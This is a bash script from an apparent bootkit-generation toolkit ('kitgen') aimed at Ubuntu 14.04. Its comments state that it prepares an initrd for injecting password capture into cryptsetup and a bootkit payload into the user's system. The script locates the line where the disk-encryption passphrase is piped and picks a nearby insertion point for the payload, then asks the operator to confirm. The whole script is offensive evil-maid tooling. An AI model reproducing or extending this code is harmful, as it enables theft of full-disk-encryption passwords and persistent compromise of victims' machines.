#!/bin/bash
#These are the default initrd lines for:
# - injecting password capture into cryptsetup password usage
# - injecting bootkit payload into user system
#
#Generally universal numbers are not recommended, but it may be worth to try
#Script SHOULD get these lines' content and ask you
#which line of script should be altered to get LVM password?
EXTRALOGLINENUMBER=$(grep -n "\$cryptkeyscript \"\$cryptkey\"" $1 | awk -F: "{print \$1}")
#which line should contain payload infection block (best: just after password)?
LINEOFFSET=$(tail $1 -n+${EXTRALOGLINENUMBER} | grep -n -m 1 "^[ \t]*$" | awk -F: "{print \$1}")
PAYLOADLINENUMBER=$((LINEOFFSET+EXTRALOGLINENUMBER-1))
TEELINE=$(tail -n+${EXTRALOGLINENUMBER} $1 | head -n1)
BLANKLINE=$(tail -n+${PAYLOADLINENUMBER} $1 | head -n1)
echo "Because there was no config for this initrd file, we can try to guess "
echo "particular lines for our needs."
echo "We need two lines"
echo
echo "One should contain:"
echo "\$cryptkeyscript \"\$cryptkey\" |"
echo
echo "the other should be a blank line few lines after the first one"
echo
echo "Our preliminary scan detected, that line number: $EXTRALOGLINENUMBER could be the right one:"
echo $TEELINE
echo
echo "And the nearest blank line is line number: $PAYLOADLINENUMBER"
echo
read -p "Do you want to use these lines? [Y/n]" -n1 -r
echo    # (optional) move to a new line
REPLY="${REPLY:-y}"

case $(echo $REPLY | tr '[A-Z]' '[a-z]') in
  y)
  echo "Thank you for your trust ;-) Now wait for the completion..."
  echo
  ;;
  n|no|*)
  echo "Please, determine line numbers manually and then create config file"
  echo "kitgen/kitgen/ubuntu_14.04_x86_64/initrd_config/"$2".config.sh"
  exit 1;
  ;;
esac
